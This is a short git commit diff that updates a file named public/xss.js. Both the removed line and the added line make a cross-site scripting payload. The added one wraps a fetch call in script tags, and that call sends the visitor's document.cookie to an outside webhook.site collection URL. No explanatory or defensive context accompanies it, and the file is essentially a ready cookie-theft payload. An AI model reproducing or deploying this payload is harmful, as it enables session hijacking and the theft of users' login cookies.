7b76f7ce48549bce0252df92386884d84ba636d3
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-08-03 02:34:39 +0330

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -1,2 +1,4 @@
 <!-- public/xss.js -->
-fetch('https://webhook.site/5e0959bf-46a4-453e-abd0-effd0519ee55/?c='+document.cookie);
+<script>
+fetch("https://webhook.site/5e0959bf-46a4-453e-abd0-effd0519ee55?c=" + encodeURIComponent(document.cookie));
+</script>
